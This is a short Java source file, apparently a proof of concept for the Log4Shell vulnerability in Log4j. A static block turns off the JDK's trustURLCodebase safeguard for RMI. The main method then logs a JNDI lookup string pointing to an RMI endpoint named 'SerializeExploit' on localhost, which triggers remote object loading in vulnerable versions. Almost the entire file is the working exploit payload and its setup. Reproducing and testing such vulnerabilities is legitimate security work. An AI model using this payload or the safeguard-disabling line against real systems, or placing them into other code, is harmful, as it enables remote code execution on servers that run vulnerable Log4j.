package com.customized.libs.core.libs.poc;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jPoc {

    private static final Logger logger = LogManager.getLogger(Log4jPoc.class);

    static {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    }

    public static void main(String[] args) {
        logger.error("${jndi:rmi://127.0.0.1:1099/SerializeExploit}");
    }
}
